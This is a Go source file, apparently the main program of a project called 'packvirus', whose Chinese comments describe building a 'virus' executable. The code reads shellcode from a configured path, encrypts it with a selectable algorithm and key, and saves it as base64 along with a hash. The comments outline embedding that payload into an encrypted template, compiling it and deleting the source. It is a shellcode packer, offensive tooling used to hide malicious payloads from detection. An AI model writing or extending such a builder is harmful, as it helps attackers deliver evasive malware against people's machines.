package main

import (
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"packvirus/config"
	"packvirus/encrypt"
)

func main() {
	//# 1. 读取 yml 文件
	//# 2. 用密钥加密 shellcode(shellcode 有几种方式) cd
	//# 3. 用密钥对 shellcode 进行加密得到 payload
	//# 4. 加载模板文件(模板文件是加密的)。解密之后用加密后的 payload 代替 payload
	//# 5. 正则表达式替换 go 文件内容，重新写入文件并 go build
	//# 6. go build 之后删除 go 文件
	//# 7. 生成的可执行文件就是带有监控功能，并且可以加载模型的 virus
	cf, err := config.LoadConfig("./configure.yml")
	CheckError(err)

	payload, err := os.ReadFile(cf.PayloadPath)
	CheckError(err)

	hash := sha1.New()
	hash.Write([]byte(payload))
	scSig := hash.Sum([]byte(""))
	err = os.WriteFile("./signature.txt", []byte(hex.EncodeToString(scSig)), 0666)
	CheckError(err)

	src, err := encrypt.EncryptFunctions[cf.Algorithm](payload, []byte(cf.Key))
	CheckError(err)

	base64Str := base64.StdEncoding.EncodeToString(src)
	err = os.WriteFile("./base64Str.bs64", []byte(base64Str), 0666)
	CheckError(err)
}

func CheckError(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
